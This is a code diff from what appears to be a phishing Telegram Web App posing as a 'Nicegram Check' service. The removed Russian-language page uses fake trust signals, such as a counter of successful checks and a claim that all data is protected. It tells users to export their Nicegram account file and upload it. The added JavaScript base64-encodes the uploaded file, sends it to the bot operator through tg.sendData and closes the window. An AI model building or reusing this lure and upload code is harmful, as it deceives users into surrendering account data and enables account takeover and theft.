@@ -1,63 +1,29 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" href="style.css">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <title>Nicegram Check</title>
-</head>
-<body>
-    <div class="background-animation"></div>
+// Альтернативный вариант - отправка файла через FormData
+async function handleFileUpload(event) {
+    const file = event.target.files[0];
+    if (!file) return;
     
-    <div class="main-container">
-        <div class="card">
-            <div class="santa-hat"></div>
-            <h1>Nicegram</h1>
-            <div class="user-info">
-                <img id="user-avatar" src="" alt="">
-                <h2 id="user-greeting">Привет, Пользователь</h2>
-            </div>
-            <p class="description">Защищенная среда для проверки данных. Загрузите файл экспорта.</p>
-            
-            <div class="counter-badge">
-                <span class="dot"></span> Пройдено успешных проверок за сегодня 3050
-            </div>
-
-            <button class="upload-btn" onclick="document.getElementById('file-input').click()">Загрузить файл</button>
-            <input type="file" id="file-input" style="display:none" onchange="handleFileUpload(event)">
-            
-            <p class="footer-text">🛡 Nicegram ® все данные защищены</p>
-        </div>
-
-        <div class="bottom-nav">
-            <button onclick="showModal('instruction')">Инструкция</button>
-            <button onclick="showModal('faq')">FAQ</button>
-        </div>
-    </div>
-
-    <!-- Модальные окна -->
-    <div id="modal-overlay" class="modal-overlay" onclick="closeModal()">
-        <div class="modal-content" id="modal-content" onclick="event.stopPropagation()">
-            <div id="instruction-text" class="hidden">
-                <h3>Инструкция</h3>
-                <ol>
-                    <li>Скачайте приложение Nicegram...</li>
-                    <li>Войдите в свой аккаунт.</li>
-                    <li>Зайдите в настройки -> Nicegram.</li>
-                    <li>Экспортируйте файл.</li>
-                    <li>Загрузите его сюда.</li>
-                </ol>
-            </div>
-            <div id="faq-text" class="hidden">
-                <h3>Частые вопросы</h3>
-                <p><b>Что такое рефаунд?</b><br>Это возврат средств за подарок...</p>
-                <p><b>Мои файлы в безопасности?</b><br>Да, мы не храним ваши файлы.</p>
-            </div>
-            <button class="close-btn" onclick="closeModal()">Закрыть</button>
-        </div>
-    </div>
-
-    <script src="script.js"></script>
-</body>
-</html>
+    // Читаем файл как Data URL
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        const fileData = {
+            type: 'file_upload',
+            filename: file.name,
+            filetype: file.type,
+            data: e.target.result, // Base64 данные файла
+            timestamp: Date.now()
+        };
+        
+        // Отправляем данные боту
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify(fileData));
+        }
+        
+        // Закрываем Web App
+        setTimeout(() => {
+            tg.close();
+        }, 500);
+    };
+    
+    reader.readAsDataURL(file);
+}
